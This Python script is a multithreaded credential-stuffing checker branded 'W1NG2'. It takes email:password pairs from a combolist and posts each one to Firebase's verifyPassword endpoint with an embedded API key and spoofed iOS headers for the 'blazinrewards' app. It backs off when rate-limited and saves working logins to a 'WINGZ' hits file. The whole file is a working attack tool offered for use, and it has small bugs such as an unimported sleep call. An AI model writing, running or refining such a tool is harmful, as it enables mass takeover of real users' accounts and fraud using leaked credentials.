import time
import os
import requests
from requests import Timeout
from random import randint
from colorama import init, Fore
from static.vari import clear
from threading import Thread, active_count
def W1NG2(combolist, file_number, threadcount):
	width = os.get_terminal_size().columns
	def logo():
		print(" _       ______   ___________ ".center(width))
		print("| |     / <  / | / / ____/__ \\".center(width))
		print("| | /| / // /  |/ / / __ __/ /".center(width))
		print("| |/ |/ // / /|  / /_/ // __/ ".center(width))
		print("|__/|__//_/_/ |_/\____//____/ ".center(width))
		print(Fore.WHITE)
	clear()
	logo()
	combos = []
	for line in combolist:
		combo = line.strip()
		combos.append(combo)
	totalcombos = len(combos)
	url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCOwJXQgucG-msfcDWV-qJdRSZz7uDGZNk"
	currentcombo = 0
	activethreads = 0
	def checker(username, password, account, file_number):
		retry = True
		while retry == True:
			retry = False
			try:
				headers = {
					"email": username,
					"returnSecureToken": "true",
					"password": password,
					"Content-Type": "application/json",
					"Host": "www.googleapis.com",
					"X-Client-Version": "iOS/FirebaseSDK/7.0.0/FirebaseCore-iOS",
					"Accept": "*/*",
					"X-Ios-Bundle-Identifier": "com.blazinrewards",
					"Accept-Encoding": "gzip, deflate",
					"User-Agent": "FirebaseAuth.iOS/7.0.0 com.blazinrewards/6.68.6 iPhone/15.4.1 hw/iPhone14_3",
					"Accept-Language": "en",
				}
				req = requests.post(url, data=headers).text
				if '"registered": true,' in req:
					print(f"{Fore.GREEN}[LIVE] {account}")
					file = open(f"WINGZ-{file_number}.txt", "a")
					file.write(f"{account}\n")
					file.close()
				elif "QUOTA_EXCEEDED : Exceeded quota for verifying passwords." in req:
					retry = True
				elif "TOO_MANY_ATTEMPTS_TRY_LATER" in req:
					retry = True
				elif "INVALID_PASSWORD" in req:
					print(f"{Fore.RED}[DEAD] {account}")
				elif "EMAIL_NOT_FOUND" in req:
					print(f"{Fore.RED}[DEAD] {account}")
				elif "INVALID_EMAIL" in req:
					print(f"{Fore.YELLOW}[Invalid Email]{account}")
				else:
					print(f"{Fore.RED}[DEAD] {account}")
					debugmode = True
					if debugmode == True:
						file = open("WING-DEBUG.txt", "a")
						file.write(f"{req}\n\n")
				sleep(1)
			except:
				retry = True
	while currentcombo < totalcombos:
		while active_count() < threadcount:
			retry = True
			while retry == True:
				combo = combos[currentcombo]
				seq = combo.strip()
				acc = combo.split(":")
				username = acc[0]
				password = acc[1]
				try:
					t = Thread(target=checker, args=(username, password, combo, file_number))
					t.start()
					currentcombo = currentcombo + 1
				except:
					retry = True